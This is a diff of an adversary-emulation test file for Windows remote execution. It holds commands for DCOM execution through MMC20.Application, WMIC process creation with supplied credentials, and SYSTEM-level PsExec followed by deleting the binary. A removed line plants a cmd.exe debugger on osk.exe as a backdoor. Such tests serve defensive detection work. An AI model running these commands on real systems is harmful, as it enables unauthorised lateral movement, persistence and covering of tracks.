@@ -34,7 +34,7 @@ atomic_tests:
     name: powershell
     elevation_required: true
     command: |
-      [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
+      [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\ipconfig.exe", $null, $null, "7")
 
 - name: WMIC Process Call Create
   description: |
@@ -60,7 +60,7 @@ atomic_tests:
   executor:
     name: command_prompt
     command: |
-      wmic /user:#{user_name} /password:#{password} /node:#{computer_name} process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"
+      wmic /user:#{user_name} /password:#{password} /node:#{computer_name} process call create "C:\Windows\system32\ipconfig.exe"
 
 - name: Psexec
   description: |
@@ -87,7 +87,8 @@ atomic_tests:
     name: command_prompt
     command: |
       /atomics/T1028/bin/PsExec64.exe
-      PsExec64.exe -accepteula -s \\#{remote_host} "C:\Windows\System32\ipconfig.exe"
+      PsExec64.exe -accepteula -s \\#{remote_host} "cmd.exe /C C:\Windows\System32\ipconfig.exe"
+      del PsExec64.exe
 
 - name: Invoke-Command
   description: |
